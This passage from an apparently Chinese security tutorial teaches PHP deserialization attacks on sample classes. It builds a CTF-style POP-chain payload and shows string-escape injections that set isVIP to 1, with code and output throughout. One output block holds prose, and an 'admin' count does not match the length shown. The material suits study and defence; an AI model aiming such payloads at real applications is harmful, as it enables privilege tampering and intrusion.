+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>观察call函数，又调用了<code>clone方法</code>，我们继续以上思路，发现并不存在直接的变量可以构造到<code>eeee类</code>，于是我们利用<code>Sec类</code>的<code>var变量</code>继续构造：<code>$res-&gt;name-&gt;var = new eeee()</code>,转移到clone函数，我们继续观察</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了isset函数，又回到start类，但是在start类中我们既没有发现cmd变量，也没有发现obj变量，因此我们只需要构造obj即可：<code>$res-&gt;name-&gt;var-&gt;obj=new Start()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;        (<span class="variable language_">$this</span>-&gt;func)();  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>回顾魔术方法的知识点，可以发现，invoke函数在<code>尝试以调用函数的形式调用对象时自动调用</code>，因此以上代码就可以使用func构造一个对象，以触动Sec类的invoke函数：<code>$res-&gt;name-&gt;var-&gt;obj-&gt;func = new Sec();</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;        <span class="keyword">echo</span> <span class="string">&#x27;you success get the flag:flag&#123;xxx&#125;&#x27;</span>;  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>基于以上了解，我们着手构造序列化对象：</p>
+<p>首先，写出大体框架，由于序列化过程中函数被忽略，我们只需要给出类和成员变量即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;<span class="comment">//对照上面代码，这里的访问权限修改为public，这是因为私有属性无法在类外进行操作，序列化/反序列化过程中可能出现问题</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后，将我们每次构造的链列出并序列化<code>res</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$res</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>(); </span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj-&gt;func = <span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最终payload：</p>
+</blockquote>
+<p>&#96; ?pop&#x3D;O:5:”Start”:2:{s:4:”name”;O:3:”Sec”:2:{s:3:”obj”;O:4:”Easy”:1:{s:3:”cla”;N;}s:3:”var”;O:4:”eeee”:1:{s:3:”obj”;O:5:”Start”:2:{s:4:”name”;N;s:4:”func”;O:3:”Sec”:2:{s:3:”obj”;N;s:3:”var”;N;}}}}s:4:”func”;N;} </p>
+<blockquote>
+<p>文章整理自<a target="_blank" rel="noopener" href="https://blog.csdn.net/shutTD/article/details/127092649?spm=1001.2014.3001.5502">csdn</a>，作者shutTD</p>
+</blockquote>
+<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><blockquote>
+<p>本质：类似sql注入，本质为闭合，不同的是sql注入闭合方式有多种，字符逃逸的闭合方式只有1种：<code>;&#125;</code></p>
+</blockquote>
+<p>样例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP反序列化字符逃逸的原理</p>
+<blockquote>
+<p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p>
+</blockquote>
+<h4 id="详解PHP反序列化字符逃逸"><a href="#详解PHP反序列化字符逃逸" class="headerlink" title="详解PHP反序列化字符逃逸"></a>详解PHP反序列化字符逃逸</h4><p>对于PHP反序列字符逃逸，我们分为以下两种情况进行讨论。<br><strong>基本原理是，我们需要保证序列化后和反序列时的串长度相等</strong></p>
+<h5 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h5><p>样例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到当这个类被初始化的时候，isVIP变量默认是0，并且不受初始化传入的参数影响。</p>
+<p>不存在filter时，这一段程序的输出结果如下：<br><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code><br>可以看到，对象序列化之后的isVIP变量是0。</p>
+<p>函数filter用于对admin字符进行替换，将admin替换为hacker<br>这一段程序的输出为：</p>
+<p><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code><br>这个时候我们把这两个程序的输出拿出来对比一下：</p>
+<p><code>O:4:&quot;user&quot;:3&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</code></p>
+<p><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //已过滤</code></p>
+<p>可以看到已过滤字符串中的hacker与前面的字符长度不对应了<br>s:5:”admin”;<br>s:5:”hacker”;</p>
+<p>在这个时候，对于我们，在新建对象时，传入的admin就是我们的可控变量</p>
+<p>接下来明确我们的目标：将isVIP变量的值修改为1，而对于该变量的修改，由于当前类的构造方法construct只初始化了两个变量，username和password，因此我们需要从password的序列化串处就开始修改，我们称这个截取的序列化串为字串</p>
+<p>我们将我们的现有子串和目标子串进行对比：</p>
+<p>“;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:0;}  &#x2F;&#x2F;现有子串<br>“;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:1;}  &#x2F;&#x2F;目标子串</p>
+<p>首先计算我们需要注入的目标子串的长度：</p>
+<p>“;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:1;}<br>&#x2F;&#x2F;以上字符串的长度为47</p>
+<p>因为我们需要逃逸（代替）的字符串长度为47，并且admin每次过滤之后都会变成hacker，也就是说每出现一次admin，就会多1个字符。</p>
+<p>因此我们在可控变量处，重复47遍admin，然后加上我们逃逸后的目标子串，可控变量修改如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>程序输出结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以数一下hacker的数量，一共是47个hacker，共282个字符，正好与前面282相对应。</p>
+<p>后面的注入子串也正好完成了逃逸。</p>
+<p>反序列化后，多余的子串会被抛弃</p>
+<p>我们接着将这个序列化结果反序列化，然后将其输出，完整代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="variable">$a_seri_filter_unseri</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_seri_filter</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a_seri_filter_unseri</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>程序输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(user)#2 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">string(282) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">string(6) &quot;123456&quot;</span><br><span class="line">  [&quot;isVIP&quot;]=&gt;</span><br><span class="line">int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个时候，isVIP这个变量就变成了1，反序列化字符逃逸的目的也就达到了。</p>
+<h5 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h5><p>上面描述了PHP反序列化字符逃逸中字符变多的情况,以下开始解释反序列化字符逃逸变少的情况。<br>首先，和上面的主体代码还是一样，还是同一个class，与之有区别的是过滤函数中，我们将<code>hacker</code>修改为<code>hack</code>。</p>
+<p>完整代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样比较一下现有子串和目标子串：</p>
+<p>“;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:0;}  &#x2F;&#x2F;现有子串<br>“;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:1;}  &#x2F;&#x2F;目标子串</p>
+<p>因为过滤的时候，将5个字符删减为了4个，所以和上面字符变多的情况相反，随着加入的admin的数量增多，现有子串后面会缩进来。</p>
+<p>计算目标子串的长度：<br>“;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:1;}  &#x2F;&#x2F;目标子串<br>&#x2F;&#x2F;长度为47<br>再计算一下到下一个可控变量的字符串长度：</p>
+<p>“;s:8:”password”;s:6:”<br>&#x2F;&#x2F;长度为22<br>因为每次过滤的时候都会少1个字符，因此我们先将admin字符重复22遍（这里的22遍不像字符变多的逃逸情况精确，后面可能会需要做调整）</p>
+<p>完整代码如下：（这里的变量里一共有22个admin）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们需要仔细看一下s后面是105，也就是说我们需要读取到105个字符。从第一个引号开始，105个字符如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:</span><br></pre></td></tr></table></figure>
+
+<p>也就是说123456这个地方成为了我们的可控变量，在123456可控变量的位置中添加我们的目标子串</p>
+<p>“;s:8:”password”;s:6:”123456”;s:5:”isVIP”;i:1;}  &#x2F;&#x2F;目标子串</p>
+<p>完整代码为：</p>
